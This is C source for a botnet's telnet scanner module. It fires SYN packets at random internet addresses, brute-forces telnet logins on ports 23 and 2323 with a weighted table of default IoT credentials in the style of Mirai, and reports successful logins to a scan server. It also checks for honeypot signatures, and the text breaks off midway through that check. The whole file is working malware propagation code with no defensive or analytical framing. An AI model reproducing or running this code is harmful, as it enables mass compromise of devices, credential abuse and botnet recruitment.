/* ==========================================================================
 *  telnet.c -- Telnet scanner module
 *  Self-contained scanner that brute-forces telnet on random IPs.
 *  Runs as a forked child; reports to scan server only.
 * ========================================================================== */

#include "bot.h"

#include <linux/ip.h>
#include <linux/tcp.h>

/* Scanner-local debug macro — writes directly to stderr in the child */
#ifdef DEBUG
#define SCAN_DBG(fmt, ...) fprintf(stderr, "[scanner] " fmt "\n", ##__VA_ARGS__)
#else
#define SCAN_DBG(fmt, ...) ((void)0)
#endif

/* Helper: format an IP stored in network order into a dotted string */
#define IP_FMT(ip) (ip) & 0xff, ((ip) >> 8) & 0xff, ((ip) >> 16) & 0xff, ((ip) >> 24) & 0xff
#define IP_ARGS    "%d.%d.%d.%d"

/* ---- Scanner constants ---- */

#define SCAN_MAX_CONNS      128
#define SCAN_RAW_PPS        160
#define SCAN_RDBUF_SIZE     256
#define SCAN_HACK_DRAIN     64

/* Strings used during telnet shell negotiation */
#define SCAN_ENABLE         "enable"
#define SCAN_SYSTEM         "system"
#define SCAN_SHELL          "shell"
#define SCAN_SH             "sh"
#define SCAN_QUERY          "/bin/busybox ECCHI"
#define SCAN_RESP           "ECCHI"
#define SCAN_NCORRECT       "ncorrect"

/* ---- Types ---- */

typedef struct {
    char    *username;
    char    *password;
    uint16_t weight_min, weight_max;
    uint8_t  username_len, password_len;
} scan_auth_t;

enum scan_state {
    SC_CLOSED = 0,
    SC_CONNECTING,
    SC_HANDLE_IACS,
    SC_WAITING_USERNAME,
    SC_WAITING_PASSWORD,
    SC_WAITING_PASSWD_RESP,
    SC_WAITING_ENABLE_RESP,
    SC_WAITING_SYSTEM_RESP,
    SC_WAITING_SHELL_RESP,
    SC_WAITING_SH_RESP,
    SC_WAITING_TOKEN_RESP,
    SC_WAITING_PROBE_RESP
};

typedef struct {
    scan_auth_t *auth;
    int          fd;
    uint32_t     last_recv;
    enum scan_state state;
    uint32_t     dst_addr;
    uint16_t     dst_port;
    int          rdbuf_pos;
    char         rdbuf[SCAN_RDBUF_SIZE];
    uint8_t      tries;
} scan_conn_t;

/* ---- Global scanner state ---- */

static pid_t        g_scan_pid        = -1;
volatile int        g_scanner_running = 0;

/* ---- Inline helpers ---- */

static uint32_t scan_rand(void)
{
    uint32_t v;
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0) return (uint32_t)time(NULL);
    if (read(fd, &v, 4) != 4) v = (uint32_t)time(NULL);
    close(fd);
    return v;
}

static uint16_t scan_checksum(const uint16_t *data, int len)
{
    uint32_t sum = 0;
    while (len > 1) { sum += *data++; len -= 2; }
    if (len == 1) sum += *(const uint8_t *)data;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

static uint16_t scan_tcp_checksum(const struct iphdr *iph, const struct tcphdr *tcph,
                                   uint16_t tcp_len_net, int payload_len)
{
    struct {
        uint32_t saddr, daddr;
        uint8_t  zero, proto;
        uint16_t tcp_len;
    } __attribute__((packed)) pseudo;

    uint32_t sum = 0;
    const uint16_t *p;
    int i;

    pseudo.saddr    = iph->saddr;
    pseudo.daddr    = iph->daddr;
    pseudo.zero     = 0;
    pseudo.proto    = IPPROTO_TCP;
    pseudo.tcp_len  = tcp_len_net;

    p = (const uint16_t *)&pseudo;
    for (i = 0; i < (int)(sizeof(pseudo) / 2); i++) sum += p[i];

    p = (const uint16_t *)tcph;
    for (i = 0; i < payload_len / 2; i++) sum += p[i];
    if (payload_len & 1) sum += ((const uint8_t *)tcph)[payload_len - 1];

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

static uint32_t scan_local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return 0;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(53);
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(fd);
        return 0;
    }
    getsockname(fd, (struct sockaddr *)&addr, &len);
    close(fd);
    return addr.sin_addr.s_addr;
}

static int scan_memsearch(const char *buf, int buf_len, const char *needle, int needle_len)
{
    int i;
    if (needle_len > buf_len) return -1;
    for (i = 0; i <= buf_len - needle_len; i++) {
        if (memcmp(buf + i, needle, needle_len) == 0)
            return i + needle_len;
    }
    return -1;
}

static int scan_can_consume(scan_conn_t *conn, const uint8_t *ptr, int amount)
{
    const uint8_t *end = (const uint8_t *)conn->rdbuf + conn->rdbuf_pos;
    return (ptr + amount) < end;
}

static int scan_recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);
    if (ret > 0) {
        int i;
        for (i = 0; i < ret; i++)
            if (((char *)buf)[i] == 0x00)
                ((char *)buf)[i] = 'A';
    }
    return ret;
}

/* ---- Credential table ---- */

static scan_auth_t *g_auth_table    = NULL;
static int          g_auth_len      = 0;
static uint16_t     g_auth_max_wt   = 0;

static void scan_add_auth(const char *user, const char *pass, uint16_t weight)
{
    scan_auth_t *tmp;
    char *udup, *pdup;

    tmp = realloc(g_auth_table, (g_auth_len + 1) * sizeof(scan_auth_t));
    if (!tmp) return;
    g_auth_table = tmp;

    udup = strdup(user);
    if (!udup) return;

    pdup = strdup(pass);
    if (!pdup) { free(udup); return; }

    g_auth_table[g_auth_len].username     = udup;
    g_auth_table[g_auth_len].username_len = (uint8_t)strlen(user);
    g_auth_table[g_auth_len].password     = pdup;
    g_auth_table[g_auth_len].password_len = (uint8_t)strlen(pass);
    g_auth_table[g_auth_len].weight_min   = g_auth_max_wt;
    g_auth_table[g_auth_len].weight_max   = g_auth_max_wt + weight;
    g_auth_len++;
    g_auth_max_wt += weight;
}

static void scan_init_auth_table(void)
{
    if (g_auth_table) return;

    scan_add_auth("root",    "xc3511",   10);
    scan_add_auth("root",    "vizxv",     9);
    scan_add_auth("root",    "admin",     8);
    scan_add_auth("admin",   "admin",     7);
    scan_add_auth("root",    "888888",    6);
    scan_add_auth("root",    "xmhdipc",   5);
    scan_add_auth("root",    "default",   5);
    scan_add_auth("root",    "juantech",  5);
    scan_add_auth("root",    "123456",    5);
    scan_add_auth("root",    "54321",     5);
    scan_add_auth("support", "support",   5);
    scan_add_auth("root",    "",          4);
    scan_add_auth("admin",   "password",  4);
    scan_add_auth("root",    "root",      4);
    scan_add_auth("root",    "12345",     4);
    scan_add_auth("user",    "user",      3);
    scan_add_auth("admin",   "",          3);
    scan_add_auth("root",    "pass",      3);
    scan_add_auth("admin",   "admin1234", 3);
    scan_add_auth("root",    "1111",      3);
    scan_add_auth("admin",   "smcadmin",  3);
    scan_add_auth("admin",   "1111",      2);
    scan_add_auth("root",    "666666",    2);
    scan_add_auth("root",    "password",  2);
    scan_add_auth("root",    "1234",      2);
    scan_add_auth("root",    "klv123",    1);
    scan_add_auth("Administrator", "admin", 1);
    scan_add_auth("service", "service",   1);
    scan_add_auth("supervisor","supervisor",1);
    scan_add_auth("guest",   "guest",     1);
    scan_add_auth("guest",   "12345",     1);
    scan_add_auth("admin1",  "password",  1);
    scan_add_auth("administrator","1234", 1);
    scan_add_auth("666666",  "666666",    1);
    scan_add_auth("888888",  "888888",    1);
    scan_add_auth("ubnt",    "ubnt",      1);
    scan_add_auth("root",    "klv1234",   1);
    scan_add_auth("root",    "Zte521",    1);
    scan_add_auth("root",    "hi3518",    1);
    scan_add_auth("root",    "jvbzd",     1);
    scan_add_auth("root",    "anko",      4);
    scan_add_auth("root",    "zlxx.",     1);
    scan_add_auth("root",    "7ujMko0vizxv", 1);
    scan_add_auth("root",    "7ujMko0admin", 1);
    scan_add_auth("root",    "system",    1);
    scan_add_auth("root",    "ikwb",      1);
    scan_add_auth("root",    "dreambox",  1);
    scan_add_auth("root",    "user",      1);
    scan_add_auth("root",    "realtek",   1);
    scan_add_auth("root",    "00000000",  1);
    scan_add_auth("admin",   "1111111",   1);
    scan_add_auth("admin",   "1234",      1);
    scan_add_auth("admin",   "12345",     1);
    scan_add_auth("admin",   "54321",     1);
    scan_add_auth("admin",   "123456",    1);
    scan_add_auth("admin",   "7ujMko0admin", 1);
    scan_add_auth("admin",   "pass",      1);
    scan_add_auth("admin",   "meinsm",    1);
    scan_add_auth("tech",    "tech",      1);
    scan_add_auth("mother",  "fucker",    1);
}

static scan_auth_t *scan_random_auth(void)
{
    uint16_t r = (uint16_t)(scan_rand() % g_auth_max_wt);
    int i;
    for (i = 0; i < g_auth_len; i++) {
        if (r >= g_auth_table[i].weight_min && r < g_auth_table[i].weight_max)
            return &g_auth_table[i];
    }
    return &g_auth_table[0];
}

/* ---- Connection management ---- */

static void scan_setup_conn(scan_conn_t *conn, uint32_t fake_time)
{
    struct sockaddr_in addr = {0};

    if (conn->fd != -1)
        close(conn->fd);
    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->fd == -1) return;

    conn->rdbuf_pos = 0;
    memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port        = conn->dst_port;

    conn->last_recv = fake_time;
    conn->state     = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
}

/* ---- Random IP generation ---- */

static uint32_t scan_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do {
        tmp = scan_rand();
        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    } while (
        o1 == 127 || o1 == 0 || o1 == 3 || o1 == 15 || o1 == 16 ||
        o1 == 56 || o1 == 10 || o1 >= 224 ||
        (o1 == 192 && o2 == 168) ||
        (o1 == 172 && o2 >= 16 && o2 < 32) ||
        (o1 == 100 && o2 >= 64 && o2 < 127) ||
        (o1 == 169 && o2 > 254) ||
        (o1 == 198 && o2 >= 18 && o2 < 20) ||
        o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 ||
        o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 ||
        o1 == 55 || o1 == 214 || o1 == 215
    );

    return tmp;
}

/* ---- Telnet protocol handlers ---- */

static int scan_consume_iacs(scan_conn_t *conn)
{
    int consumed = 0;
    uint8_t *ptr = (uint8_t *)conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        if (*ptr != 0xff)
            break;

        if (!scan_can_consume(conn, ptr, 1))
            break;

        if (ptr[1] == 0xff) {
            ptr += 2; consumed += 2;
            continue;
        }

        if (ptr[1] == 0xfd) {
            uint8_t tmp1[3] = {255, 251, 31};
            uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

            if (!scan_can_consume(conn, ptr, 2))
                break;
            if (ptr[2] != 31)
                goto iac_wont;

            ptr += 3; consumed += 3;
            send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
            send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
        } else {
            int j;
            iac_wont:
            if (!scan_can_consume(conn, ptr, 2))
                break;

            for (j = 0; j < 3; j++) {
                if (ptr[j] == 0xfd)      ptr[j] = 0xfc;
                else if (ptr[j] == 0xfb) ptr[j] = 0xfd;
            }

            send(conn->fd, ptr, 3, MSG_NOSIGNAL);
            ptr += 3; consumed += 3;
        }
    }
    return consumed;
}

static int scan_consume_any_prompt(scan_conn_t *conn)
{
    int i, prompt_ending = -1;
    for (i = conn->rdbuf_pos - 1; i > 0; i--) {
        /* Skip ANSI CSI sequences: ESC [ <params> <letter> */
        if (conn->rdbuf[i] >= 0x40 && (unsigned char)conn->rdbuf[i] <= 0x7e && i >= 2) {
            int j = i - 1;
            while (j >= 0 && ((conn->rdbuf[j] >= '0' && conn->rdbuf[j] <= '9') ||
                   conn->rdbuf[j] == ';' || conn->rdbuf[j] == '?'))
                j--;
            if (j >= 1 && conn->rdbuf[j] == '[' && conn->rdbuf[j-1] == 0x1b) {
                i = j - 1;
                continue;
            }
        }
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' ||
            conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' ||
            conn->rdbuf[i] == '%') {
            prompt_ending = i + 1;
            break;
        }
    }
    return (prompt_ending == -1) ? 0 : prompt_ending;
}

static int scan_consume_user_prompt(scan_conn_t *conn)
{
    int i, prompt_ending = -1;
    for (i = conn->rdbuf_pos - 1; i > 0; i--) {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' ||
            conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' ||
            conn->rdbuf[i] == '%') {
            prompt_ending = i + 1;
            break;
        }
    }
    if (prompt_ending == -1) {
        int tmp;
        if ((tmp = scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
            prompt_ending = tmp;
        else if ((tmp = scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
            prompt_ending = tmp;
    }
    return (prompt_ending == -1) ? 0 : prompt_ending;
}

static int scan_consume_pass_prompt(scan_conn_t *conn)
{
    int i, prompt_ending = -1;
    for (i = conn->rdbuf_pos - 1; i > 0; i--) {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' ||
            conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#') {
            prompt_ending = i + 1;
            break;
        }
    }
    if (prompt_ending == -1) {
        int tmp;
        if ((tmp = scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
            prompt_ending = tmp;
    }
    return (prompt_ending == -1) ? 0 : prompt_ending;
}

static int scan_consume_resp_prompt(scan_conn_t *conn)
{
    int prompt_ending;

    if (scan_memsearch(conn->rdbuf, conn->rdbuf_pos, SCAN_NCORRECT,
                       (int)strlen(SCAN_NCORRECT)) != -1)
        return -1;

    prompt_ending = scan_memsearch(conn->rdbuf, conn->rdbuf_pos, SCAN_RESP,
                                   (int)strlen(SCAN_RESP));
    return (prompt_ending == -1) ? 0 : prompt_ending;
}

/* ---- Scan server TCP connection ---- */

static int g_scan_srv_fd = -1;

static int scan_srv_connect(const char *host, int port)
{
    struct sockaddr_in addr;
    int fd;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = htons((uint16_t)port);

    if (inet_pton(AF_INET, host, &addr.sin_addr) <= 0) {
        /* Try DNS resolution */
        struct hostent *he = gethostbyname(host);
        if (!he) { close(fd); return -1; }
        memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    }

    /* Non-blocking connect with 5s timeout */
    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    connect(fd, (struct sockaddr *)&addr, sizeof(addr));

    {
        fd_set wfds;
        struct timeval tv;
        int err = 0;
        socklen_t elen = sizeof(err);

        FD_ZERO(&wfds);
        FD_SET(fd, &wfds);
        tv.tv_sec = 5; tv.tv_usec = 0;

        if (select(fd + 1, NULL, &wfds, NULL, &tv) <= 0 ||
            getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &elen) != 0 || err != 0) {
            close(fd);
            return -1;
        }
    }

    /* Back to blocking */
    fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) & ~O_NONBLOCK);
    return fd;
}

static int scan_srv_alive(void)
{
    /* Quick liveness check — peek with MSG_DONTWAIT.
     * recv returns 0 on clean close, -1/EAGAIN if alive. */
    char tmp;
    int r;
    if (g_scan_srv_fd < 0) return 0;
    r = recv(g_scan_srv_fd, &tmp, 1, MSG_DONTWAIT | MSG_PEEK);
    if (r == 0) { /* peer closed */
        close(g_scan_srv_fd);
        g_scan_srv_fd = -1;
        return 0;
    }
    return 1; /* alive (EAGAIN) or data waiting — both fine */
}

static void scan_srv_send(const char *line)
{
    if (g_scan_srv_fd < 0) return;
    if (send(g_scan_srv_fd, line, strlen(line), MSG_NOSIGNAL) <= 0) {
        close(g_scan_srv_fd);
        g_scan_srv_fd = -1;
    }
}

/* ---- Scanner child process main loop ---- */

static void scan_child_main(const char *scan_srv_addr)
{
    int rsck, i;
    uint16_t source_port;
    uint32_t local_addr, fake_time;
    char rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *iph;
    struct tcphdr *tcph;
    scan_conn_t *conn_table;
    uint32_t last_spew = 0;
    char scan_host[256] = {0};
    int  scan_port = 0;

    /* Parse scan server address (host:port) */
    if (scan_srv_addr && scan_srv_addr[0] != '\0') {
        const char *colon = strrchr(scan_srv_addr, ':');
        if (colon && colon > scan_srv_addr) {
            size_t hlen = (size_t)(colon - scan_srv_addr);
            if (hlen >= sizeof(scan_host)) hlen = sizeof(scan_host) - 1;
            memcpy(scan_host, scan_srv_addr, hlen);
            scan_host[hlen] = '\0';
            scan_port = atoi(colon + 1);
        }
    }

    /* Connect to scan server if configured */
    if (scan_host[0] && scan_port > 0) {
        SCAN_DBG("Connecting to scan server %s:%d ...", scan_host, scan_port);
        g_scan_srv_fd = scan_srv_connect(scan_host, scan_port);
        if (g_scan_srv_fd >= 0)
            SCAN_DBG("Scan server connected (fd=%d)", g_scan_srv_fd);
        else
            SCAN_DBG("Scan server unreachable");
    } else {
        SCAN_DBG("No scan server configured");
    }

    local_addr = scan_local_addr();
    if (local_addr == 0) {
        SCAN_DBG("Failed to determine local address");
        _exit(1);
    }
    SCAN_DBG("Local address: " IP_ARGS, IP_FMT(local_addr));

    scan_init_auth_table();
    SCAN_DBG("Auth table loaded: %d entries, max weight %d", g_auth_len, g_auth_max_wt);
    fake_time = (uint32_t)time(NULL);

    conn_table = calloc(SCAN_MAX_CONNS, sizeof(scan_conn_t));
    if (!conn_table) {
        SCAN_DBG("Failed to allocate connection table");
        _exit(1);
    }
    for (i = 0; i < SCAN_MAX_CONNS; i++) {
        conn_table[i].state = SC_CLOSED;
        conn_table[i].fd    = -1;
    }

    /* Raw socket for SYN scanning */
    rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (rsck == -1) {
        SCAN_DBG("Failed to create raw socket (errno=%d)", errno);
        free(conn_table);
        _exit(1);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0) {
        SCAN_DBG("Failed to set IP_HDRINCL (errno=%d)", errno);
        close(rsck);
        free(conn_table);
        _exit(1);
    }
    SCAN_DBG("Raw socket ready (fd=%d)", rsck);

    /* Random source port */
    do { source_port = (uint16_t)(scan_rand() & 0xffff); }
    while (ntohs(source_port) < 1024);
    SCAN_DBG("Source port: %d", ntohs(source_port));

    /* Build raw packet template */
    memset(rawpkt, 0, sizeof(rawpkt));
    iph  = (struct iphdr *)rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    iph->ihl      = 5;
    iph->version   = 4;
    iph->tot_len   = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id        = (uint16_t)scan_rand();
    iph->ttl       = 64;
    iph->protocol  = IPPROTO_TCP;

    tcph->dest   = htons(23);
    tcph->source = source_port;
    tcph->doff   = 5;
    tcph->window = (uint16_t)(scan_rand() & 0xffff);
    tcph->syn    = 1;

    SCAN_DBG("Scanner initialized, entering main loop (max_conns=%d, raw_pps=%d)",
             SCAN_MAX_CONNS, SCAN_RAW_PPS);

    /* ---- Main scanning loop ---- */
    while (1)
    {
        fd_set fdset_rd, fdset_wr;
        struct timeval tim;
        int last_avail_conn, mfd_rd = 0, mfd_wr = 0, nfds;
        scan_conn_t *conn;

        /* Spew SYN packets to random IPs */
        if (fake_time != last_spew)
        {
            last_spew = fake_time;
            for (i = 0; i < SCAN_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr  *ih = (struct iphdr *)rawpkt;
                struct tcphdr *th = (struct tcphdr *)(ih + 1);

                ih->id    = (uint16_t)scan_rand();
                ih->saddr = local_addr;
                ih->daddr = scan_random_ip();
                ih->check = 0;
                ih->check = scan_checksum((uint16_t *)ih, sizeof(struct iphdr));

                th->dest  = (i % 10 == 0) ? htons(2323) : htons(23);
                th->seq   = ih->daddr;
                th->check = 0;
                th->check = scan_tcp_checksum(ih, th, htons(sizeof(struct tcphdr)),
                                              sizeof(struct tcphdr));

                paddr.sin_family      = AF_INET;
                paddr.sin_addr.s_addr = ih->daddr;
                paddr.sin_port        = th->dest;

                sendto(rsck, rawpkt, sizeof(rawpkt), MSG_NOSIGNAL,
                       (struct sockaddr *)&paddr, sizeof(paddr));
            }
        }

        /* Read SYN+ACK responses */
        last_avail_conn = 0;
        while (1)
        {
            int n;
            char dgram[1514];
            struct iphdr  *riph  = (struct iphdr *)dgram;
            struct tcphdr *rtcph = (struct tcphdr *)(riph + 1);

            errno = 0;
            n = recvfrom(rsck, dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if (n < (int)(sizeof(struct iphdr) + sizeof(struct tcphdr))) continue;
            if (riph->daddr != local_addr)      continue;
            if (riph->protocol != IPPROTO_TCP)   continue;
            if (rtcph->source != htons(23) && rtcph->source != htons(2323)) continue;
            if (rtcph->dest != source_port)      continue;
            if (!rtcph->syn || !rtcph->ack)      continue;
            if (rtcph->rst || rtcph->fin)        continue;
            if (htonl(ntohl(rtcph->ack_seq) - 1) != riph->saddr) continue;

            /* Find free connection slot */
            conn = NULL;
            for (n = last_avail_conn; n < SCAN_MAX_CONNS; n++) {
                if (conn_table[n].state == SC_CLOSED) {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }
            if (conn == NULL) break;

            conn->dst_addr = riph->saddr;
            conn->dst_port = rtcph->source;
            SCAN_DBG("SYN+ACK from " IP_ARGS ":%d — attempting brute",
                     IP_FMT(riph->saddr), ntohs(rtcph->source));
            scan_setup_conn(conn, fake_time);
        }

        /* Build fd_sets for select() */
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCAN_MAX_CONNS; i++)
        {
            int timeout;
            conn = &conn_table[i];
            timeout = (conn->state > SC_CONNECTING ? 30 : 5);

            if (conn->state != SC_CLOSED &&
                (fake_time - conn->last_recv) > (uint32_t)timeout)
            {
                SCAN_DBG("FD%d " IP_ARGS " timed out (state=%d, tries=%d)",
                         conn->fd, IP_FMT(conn->dst_addr), conn->state, conn->tries);
                close(conn->fd);
                conn->fd = -1;

                /* Only retry early states (IAC/username/password prompt wait).
                 * Once past login (PASSWD_RESP+), a timeout means the attempt
                 * is done — don't report unverified creds and don't retry. */
                if (conn->state > SC_HANDLE_IACS && conn->state < SC_WAITING_PASSWD_RESP) {
                    if (++(conn->tries) == 10) {
                        SCAN_DBG(IP_ARGS " gave up after 10 tries", IP_FMT(conn->dst_addr));
                        conn->tries = 0;
                        conn->state = SC_CLOSED;
                    } else {
                        SCAN_DBG(IP_ARGS " retrying (attempt %d)", IP_FMT(conn->dst_addr), conn->tries);
                        scan_setup_conn(conn, fake_time);
                    }
                } else {
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                }
                continue;
            }

            if (conn->state == SC_CONNECTING) {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd_wr) mfd_wr = conn->fd;
            } else if (conn->state != SC_CLOSED) {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd_rd) mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec  = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd),
                      &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = (uint32_t)time(NULL);

        /* Process connections */
        for (i = 0; i < SCAN_MAX_CONNS; i++)
        {
            conn = &conn_table[i];
            if (conn->fd == -1) continue;

            /* Check connect completion */
            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                if (getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len) == 0
                    && err == 0)
                {
                    conn->state     = SC_HANDLE_IACS;
                    conn->auth      = scan_random_auth();
                    conn->rdbuf_pos = 0;
                    SCAN_DBG("FD%d " IP_ARGS " connected — trying %s:%s",
                             conn->fd, IP_FMT(conn->dst_addr),
                             conn->auth->username, conn->auth->password);
                } else {
                    SCAN_DBG("FD%d " IP_ARGS " connect failed (err=%d)",
                             conn->fd, IP_FMT(conn->dst_addr), err);
                    close(conn->fd);
                    conn->fd    = -1;
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                    continue;
                }
            }

            /* Process readable data */
            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                while (1)
                {
                    int ret;

                    if (conn->state == SC_CLOSED) break;

                    if (conn->rdbuf_pos == SCAN_RDBUF_SIZE) {
                        memmove(conn->rdbuf, conn->rdbuf + SCAN_HACK_DRAIN,
                                SCAN_RDBUF_SIZE - SCAN_HACK_DRAIN);
                        conn->rdbuf_pos -= SCAN_HACK_DRAIN;
                    }

                    errno = 0;
                    ret = scan_recv_strip_null(conn->fd,
                              conn->rdbuf + conn->rdbuf_pos,
                              SCAN_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);

                    if (ret == 0) { errno = ECONNRESET; ret = -1; }

                    if (ret == -1) {
                        if (errno != EAGAIN && errno != EWOULDBLOCK) {
                            SCAN_DBG("FD%d " IP_ARGS " connection lost (state=%d, errno=%d)",
                                     conn->fd, IP_FMT(conn->dst_addr), conn->state, errno);
                            close(conn->fd);
                            conn->fd = -1;
                            /* Only retry early states; post-login disconnects
                             * are not retried to avoid duplicate/false reports */
                            if (conn->state < SC_WAITING_PASSWD_RESP) {
                                if (++(conn->tries) >= 10) {
                                    SCAN_DBG(IP_ARGS " gave up after 10 tries", IP_FMT(conn->dst_addr));
                                    conn->tries = 0;
                                    conn->state = SC_CLOSED;
                                } else {
                                    SCAN_DBG(IP_ARGS " retrying (attempt %d)", IP_FMT(conn->dst_addr), conn->tries);
                                    scan_setup_conn(conn, fake_time);
                                }
                            } else {
                                conn->tries = 0;
                                conn->state = SC_CLOSED;
                            }
                        }
                        break;
                    }

                    conn->rdbuf_pos += ret;
                    conn->last_recv = fake_time;

                    /* State machine */
                    while (1)
                    {
                        int consumed = 0;

                        switch (conn->state)
                        {
                        case SC_HANDLE_IACS:
                            if ((consumed = scan_consume_iacs(conn)) > 0) {
                                SCAN_DBG("FD%d " IP_ARGS " IAC negotiation done",
                                         conn->fd, IP_FMT(conn->dst_addr));
                                conn->state = SC_WAITING_USERNAME;
                            }
                            break;

                        case SC_WAITING_USERNAME:
                            if ((consumed = scan_consume_user_prompt(conn)) > 0) {
                                SCAN_DBG("FD%d " IP_ARGS " got login prompt, sending user '%s'",
                                         conn->fd, IP_FMT(conn->dst_addr), conn->auth->username);
                                send(conn->fd, conn->auth->username,
                                     conn->auth->username_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_PASSWORD;
                            }
                            break;

                        case SC_WAITING_PASSWORD:
                            if ((consumed = scan_consume_pass_prompt(conn)) > 0) {
                                SCAN_DBG("FD%d " IP_ARGS " got password prompt, sending pass '%s'",
                                         conn->fd, IP_FMT(conn->dst_addr), conn->auth->password);
                                send(conn->fd, conn->auth->password,
                                     conn->auth->password_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_PASSWD_RESP;
                            }
                            break;

                        case SC_WAITING_PASSWD_RESP:
                            if ((consumed = scan_consume_any_prompt(conn)) > 0) {
                                /* Check for login failure (Shinobi-style specific patterns) */
                                if (scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "ncorrect", 8) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "access denied", 13) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "permission denied", 17) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "login failed", 12) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "auth failed", 11) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "invalid password", 16) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "wrong password", 14) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "refused", 7) != -1) {
                                    SCAN_DBG("FD%d " IP_ARGS " AUTH FAILED %s:%s (try %d)",
                                             conn->fd, IP_FMT(conn->dst_addr),
                                             conn->auth->username, conn->auth->password,
                                             conn->tries + 1);
                                    close(conn->fd);
                                    conn->fd = -1;
                                    if (++(conn->tries) == 10) {
                                        SCAN_DBG(IP_ARGS " gave up after 10 tries", IP_FMT(conn->dst_addr));
                                        conn->tries = 0;
                                        conn->state = SC_CLOSED;
                                    } else {
                                        scan_setup_conn(conn, fake_time);
                                    }
                                    break;
                                }
                                /* Passive honeypot check — Cowrie/Kippo sigs in MOTD */
                                if (scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "BusyBox v1.20.2", 15) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "BusyBox v1.19.3", 15) != -1 ||
